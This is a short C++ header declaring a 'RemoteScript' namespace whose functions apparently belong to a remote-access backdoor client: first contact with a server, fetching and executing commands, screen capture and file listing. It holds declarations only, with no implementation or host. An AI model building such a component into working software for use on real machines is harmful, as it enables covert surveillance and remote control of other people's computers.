#ifndef REMOTESCRIPT_H
#define REMOTESCRIPT_H

#include "httpapi.h"
#include "screenshot.h"
#include "filesearcher.h"
#include "commandline.h"

#include "structs.h"
#include "config.h"
#include "resource.h"

#include "..\Common\defines.h"
#include "..\Common\crypt.h"
#include "..\Common\os.h"
#include "..\Common\time.h"
#include "..\Common\user.h"
#include "..\Common\regedit.h"
#include "..\Common\file.h"

namespace RemoteScript{
	DWORD init(void);
	DWORD uninit(void);
	void _firstHello(PCORE_DATA _actionData);
	void _getCommand(PCORE_DATA _actionData);
	void _excecuteCmd(PCORE_DATA _actionData);
	void _captureScreen(PCORE_DATA _actionData);
	void _listFile(PCORE_DATA _actionData);
};
#endif